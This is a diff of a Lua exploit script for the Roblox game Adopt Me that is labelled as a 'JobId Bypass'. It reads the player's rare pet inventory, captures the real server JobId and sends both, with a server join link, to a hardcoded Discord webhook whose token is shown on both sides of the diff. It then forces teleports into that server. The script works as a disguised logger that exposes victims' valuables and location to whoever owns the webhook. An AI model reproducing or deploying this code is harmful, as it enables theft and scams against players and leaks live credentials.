@@ -1,15 +1,15 @@
+-- ==============================
+-- JobId Bypass + Inventory Check
+-- ==============================
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-local placeId = 126884695634066 -- Adopt Me placeId (или меняйте по нужде)
-local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
-local MinUnique, MinAncient, MinGodly = 1, 1, 1
-local spoofedJobId = game.JobId
+local PlaceId = 126884695634066 -- Adopt Me PlaceId
+local webhookUrl = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
 
 -- ---------------------------
--- Функция для получения инвентаря
+-- Функция получения инвентаря
 local function getInventory()
     local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
     local uniqueItems, ancientItems, godlyItems = {}, {}, {}
@@ -33,28 +33,26 @@ local function getInventory()
 end
 
 -- ---------------------------
--- Функция отправки webhook
+-- Функция отправки вебхука
 local function sendWebhook(realJobId)
     local counts, uniqueItems, ancientItems, godlyItems = getInventory()
-    if counts.unique >= MinUnique or counts.ancient >= MinAncient or counts.godly >= MinGodly then
-        local fernUrl = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
+    if counts.unique >= 1 or counts.ancient >= 1 or counts.godly >= 1 then
+        local fernUrl = "https://fern.wtf/joiner?placeId=" .. PlaceId .. "&gameInstanceId=" .. realJobId
         local webhookData = {
             embeds = {{
                 title = "🔍 JobID + Inventory Info",
                 description = "Captured real JobID and inventory",
                 color = 65280,
                 fields = {
-                    { name = "Spoofed JobID", value = spoofedJobId, inline = true },
                     { name = "Real JobID", value = realJobId, inline = true },
-                    { name = "Fern.wtf Join Link", value = fernUrl, inline = false },
                     { name = "Uniques", value = #uniqueItems > 0 and table.concat(uniqueItems, ", ") or "None", inline = false },
                     { name = "Ancients", value = #ancientItems > 0 and table.concat(ancientItems, ", ") or "None", inline = false },
                     { name = "Godlies", value = #godlyItems > 0 and table.concat(godlyItems, ", ") or "None", inline = false },
+                    { name = "Fern.wtf Join Link", value = fernUrl, inline = false }
                 },
                 footer = { text = "Delta JobID + Inventory Logger" }
             }}
         }
-
         pcall(function()
             http_request({
                 Url = webhookUrl,
@@ -67,20 +65,22 @@ local function sendWebhook(realJobId)
 end
 
 -- ---------------------------
--- Перехват real JobId + отправка webhook
+-- JobId Bypass + Перехват realJobId
 TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportInfo)
     if teleportInfo and teleportInfo.ServerInstanceId then
         local realJobId = teleportInfo.ServerInstanceId
         print("Real JobId detected:", realJobId)
+
+        -- Отправляем webhook с инвентарём
         sendWebhook(realJobId)
 
         -- ---------------------------
-        -- Перезаходчик
+        -- Перезаходчик с реальным JobId
         queue_on_teleport(string.format([[getgenv().JobId = "%s"]], realJobId))
         for i = 1, 2 do
             task.spawn(function()
                 pcall(function()
-                    TeleportService:TeleportToPlaceInstance(placeId, realJobId)
+                    TeleportService:TeleportToPlaceInstance(PlaceId, realJobId)
                 end)
             end)
             task.wait()
@@ -93,7 +93,7 @@ end)
 for i = 1, 2 do
     task.spawn(function()
         pcall(function()
-            TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
+            TeleportService:TeleportToPlaceInstance(PlaceId, "00000000-0000-0000-0000-000000000000")
         end)
     end)
     task.wait()
